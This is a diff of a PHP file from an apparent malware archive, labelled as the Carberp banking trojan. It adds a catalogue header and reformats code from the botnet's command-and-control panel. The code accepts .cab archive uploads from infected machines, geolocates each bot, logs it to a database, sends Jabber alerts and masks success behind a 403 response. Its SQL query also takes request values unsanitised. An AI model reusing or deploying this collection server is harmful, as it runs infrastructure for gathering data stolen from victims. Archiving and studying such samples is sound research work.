@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 $dbug = false;
@@ -119,11 +130,15 @@ if(!empty($_POST['type_name'])){
     	}
     }
 
-	if(file_exists($_FILES['cab']['tmp_name'])){		$file_name = $dir . 'logs/cabs/' . mt_rand() . '.cab';
+	if(file_exists($_FILES['cab']['tmp_name'])){
+		$file_name = $dir . 'logs/cabs/' . mt_rand() . '.cab';
 		if(file_exists($file_name)) $file_name = $dir . 'logs/cabs/' . mt_rand() . '.cab';
 		
-		if(function_exists('geoip_country_code_by_name')){			$country = geoip_country_code_by_name($_SERVER['REMOTE_ADDR']);
-		}else{			if(file_exists($dir . 'cache/geoip/')){				require_once($dir . 'cache/geoip/geoip.inc');
+		if(function_exists('geoip_country_code_by_name')){
+			$country = geoip_country_code_by_name($_SERVER['REMOTE_ADDR']);
+		}else{
+			if(file_exists($dir . 'cache/geoip/')){
+				require_once($dir . 'cache/geoip/geoip.inc');
 				$gi = geoip_open($dir . 'cache/geoip/GeoIP.dat',GEOIP_STANDARD);
 				$country = geoip_country_code_by_addr($gi, $_SERVER['REMOTE_ADDR']);
 				geoip_close($gi);
@@ -133,14 +148,18 @@ if(!empty($_POST['type_name'])){
 		}
 		if(empty($country)) $country = 'UNK';
 		
-		if(!move_uploaded_file($_FILES['cab']['tmp_name'], $file_name)){			$write = false;
+		if(!move_uploaded_file($_FILES['cab']['tmp_name'], $file_name)){
+			$write = false;
 		}else{
 			if(!$mysqli->real_query('INSERT DELAYED INTO bf_cabs (prefix, uid, country, ip, file, size, type, ready, chk) VALUES (\''.$_POST['prefix'].'\',\''.$_POST['uid'].'\',\''.$country.'\',\''.$_SERVER['REMOTE_ADDR'].'\',\''.basename($file_name).'\',\''.$_FILES['cab']['size'].'\', \''.$_POST['type_name'].'\', \'1\', \''.$chk.'\')')) $write = false;
 			//if($write == true) $mysqli->query("INSERT DELAYED INTO bf_bots (uid, prefix, country, ip, last_date, post_date) VALUES ('".$_POST['uid']."', '".$_POST['prefix']."', '".$country."', '".$_SERVER['REMOTE_ADDR']."', '".time()."', '".time()."') ON DUPLICATE KEY UPDATE post_date='".time()."'");
 		}
 		
-		if($config['jabber']['cab'] == 1 && !empty($config['jabber']['tracking'])){			if(function_exists('ioncube_read_file')){				$text = @ioncube_read_file($dir . 'templates/modules/bots/bot_online.tpl');
-			}else{				$text = @file_get_contents($dir . 'templates/modules/bots/bot_online.tpl');
+		if($config['jabber']['cab'] == 1 && !empty($config['jabber']['tracking'])){
+			if(function_exists('ioncube_read_file')){
+				$text = @ioncube_read_file($dir . 'templates/modules/bots/bot_online.tpl');
+			}else{
+				$text = @file_get_contents($dir . 'templates/modules/bots/bot_online.tpl');
 			}
 			
 			$text = str_replace('{UID}', $bot->prefix . $bot->uid, $text);
@@ -161,7 +180,8 @@ if(!empty($_POST['type_name'])){
 			}
 		}
 		
-		if($write == true){			header("Status: 403 Forbidden");
+		if($write == true){
+			header("Status: 403 Forbidden");
 			header("HTTP/1.1 403 Forbidden");
 			print_data('OK!', true, true);
 		}
